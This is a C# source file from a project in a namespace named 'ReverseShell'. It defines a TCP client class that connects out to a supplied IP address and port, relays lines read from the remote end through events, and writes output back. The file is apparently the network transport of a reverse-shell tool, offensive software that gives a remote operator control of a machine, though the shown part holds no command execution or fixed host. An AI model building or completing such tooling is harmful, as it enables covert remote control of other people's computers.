using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ReverseShell
{
    class TcpSyncNetService : INetService
    {
        public TcpClient Client { get; set; }
        private NetworkStream NetStream { get; set; }
        private StreamReader Reader { get; set; }
        private StreamWriter Writer { get; set; }


        public event LineReceivedHandler OutputDataReceived;
        public event ConnectedHandler Connected;
        public event DisconnectionHandler ClientDisconnected;

        public delegate void LineReceivedHandler(string line);

        public delegate void ConnectedHandler();

        public delegate void DisconnectionHandler();


        public void Start(IPAddress iPAddress, int port)
        {
            Client = new TcpClient(AddressFamily.InterNetwork);
            Client.Connect(iPAddress, port);

            NetStream = Client.GetStream();
            Reader = new StreamReader(NetStream);
            Writer = new StreamWriter(NetStream);

            Connected?.Invoke();
        }


        public void WriteLine(string line)
        {
            if (!line.EndsWith("\n"))
                line += "\n";

            Write(line);
        }

        public void Write(string output)
        {
            try
            {
                Writer.Write(output);
                Writer.Flush();
            }
            catch (IOException exception)
            {
                CloseAndNotify();
            }
        }


        public void ReadSync()
        {
            try
            {
                while (true)
                {
                    string line = Reader.ReadLine();
                    OutputDataReceived?.Invoke(line);
                }
            }
            catch (IOException exception)
            {
                CloseAndNotify();
            }
        }

        public void InteractAsync()
        {
            new Thread(ReadSync).Start();
        }

        private void CloseAndNotify()
        {
            Close();
            ClientDisconnected?.Invoke();
        }

        private void Close()
        {
            Writer.Close();
            Reader.Close();
            NetStream.Close();
        }

        public void Shutdown()
        {
            Close();
        }
    }
}